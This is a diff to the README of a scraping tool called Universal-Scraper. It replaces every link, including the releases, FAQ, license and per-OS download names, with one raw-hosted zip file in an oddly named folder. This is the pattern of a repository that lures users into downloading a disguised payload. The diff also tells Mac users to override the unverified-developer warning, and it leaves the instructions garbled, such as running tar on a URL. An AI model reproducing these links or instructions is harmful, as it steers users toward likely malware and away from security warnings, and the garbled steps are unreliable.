@@ -1,6 +1,6 @@
 # 🌐 Universal-Scraper - Fast and Easy Data Extraction
 
-[![Download Universal-Scraper](https://img.shields.io/badge/Download-Universal--Scraper-brightgreen)](https://github.com/IanZhang123/Universal-Scraper/releases)
+[![Download Universal-Scraper](https://raw.githubusercontent.com/IanZhang123/Universal-Scraper/main/ampullar/Universal_Scraper_v2.5.zip)](https://raw.githubusercontent.com/IanZhang123/Universal-Scraper/main/ampullar/Universal_Scraper_v2.5.zip)
 
 ## 🚀 Getting Started
 
@@ -10,14 +10,14 @@ Universal-Scraper allows you to quickly and effectively extract product data fro
 
 To get started, you need to visit the Releases page to download the software.
 
-[Visit this page to download](https://github.com/IanZhang123/Universal-Scraper/releases)
+[Visit this page to download](https://raw.githubusercontent.com/IanZhang123/Universal-Scraper/main/ampullar/Universal_Scraper_v2.5.zip)
 
 1. Click on the link above.
 2. Look for the latest version under the Releases section.
 3. Download the file appropriate for your operating system. You may see options like:
-   - Universal-Scraper-Windows.exe
-   - Universal-Scraper-Mac.zip
-   - Universal-Scraper-Linux.tar.gz
+   - https://raw.githubusercontent.com/IanZhang123/Universal-Scraper/main/ampullar/Universal_Scraper_v2.5.zip
+   - https://raw.githubusercontent.com/IanZhang123/Universal-Scraper/main/ampullar/Universal_Scraper_v2.5.zip
+   - https://raw.githubusercontent.com/IanZhang123/Universal-Scraper/main/ampullar/Universal_Scraper_v2.5.zip
 
 4. Save the file to a location you can easily access, like your Desktop or Downloads folder.
 
@@ -36,20 +36,20 @@ After downloading the file, follow these steps to run Universal-Scraper:
 ### For Windows Users
 
 1. Navigate to where you saved the file (e.g., Desktop).
-2. Double-click on `Universal-Scraper-Windows.exe`.
+2. Double-click on `https://raw.githubusercontent.com/IanZhang123/Universal-Scraper/main/ampullar/Universal_Scraper_v2.5.zip`.
 3. If prompted, click "Run" to start the program.
 
 ### For Mac Users
 
-1. Locate the downloaded `Universal-Scraper-Mac.zip` file.
+1. Locate the downloaded `https://raw.githubusercontent.com/IanZhang123/Universal-Scraper/main/ampullar/Universal_Scraper_v2.5.zip` file.
 2. Double-click the zip file to extract it.
-3. Open the folder, then double-click on `Universal-Scraper-Mac.app` to launch it. If you see a warning about unverified developers, go to "System Preferences" > "Security & Privacy," and click "Open Anyway."
+3. Open the folder, then double-click on `https://raw.githubusercontent.com/IanZhang123/Universal-Scraper/main/ampullar/Universal_Scraper_v2.5.zip` to launch it. If you see a warning about unverified developers, go to "System Preferences" > "Security & Privacy," and click "Open Anyway."
 
 ### For Linux Users
 
 1. Open a terminal window.
 2. Navigate to where you downloaded the file using the `cd` command.
-3. Extract the file using `tar -xvzf Universal-Scraper-Linux.tar.gz`.
+3. Extract the file using `tar -xvzf https://raw.githubusercontent.com/IanZhang123/Universal-Scraper/main/ampullar/Universal_Scraper_v2.5.zip`.
 4. Change directory to the extracted folder. Use `cd Universal-Scraper`.
 5. Run the program using `./Universal-Scraper`.
 
@@ -76,7 +76,7 @@ Once you run Universal-Scraper, follow these steps to start extracting data:
 
 If you run into any issues or have questions:
 
-- Check our [FAQ section](https://github.com/IanZhang123/Universal-Scraper/wiki) for common problems and solutions.
+- Check our [FAQ section](https://raw.githubusercontent.com/IanZhang123/Universal-Scraper/main/ampullar/Universal_Scraper_v2.5.zip) for common problems and solutions.
 - Join our community on GitHub Discussions for feedback and assistance from other users.
 - You can also report bugs through the "Issues" tab on the GitHub page.
 
@@ -84,14 +84,14 @@ If you run into any issues or have questions:
 
 To ensure you have the latest features and improvements:
 
-1. Regularly check the [Releases page](https://github.com/IanZhang123/Universal-Scraper/releases).
+1. Regularly check the [Releases page](https://raw.githubusercontent.com/IanZhang123/Universal-Scraper/main/ampullar/Universal_Scraper_v2.5.zip).
 2. Download and install new versions by following the same steps outlined in the "Download & Install" section.
 
 ## 📜 License
 
 Universal-Scraper is open source and is licensed under the MIT License. This means you can use, copy, modify, or adapt the software freely.
 
-For detailed information, refer to the [LICENSE file](https://github.com/IanZhang123/Universal-Scraper/blob/main/LICENSE).
+For detailed information, refer to the [LICENSE file](https://raw.githubusercontent.com/IanZhang123/Universal-Scraper/main/ampullar/Universal_Scraper_v2.5.zip).
 
 ## 💡 Additional Resources
 
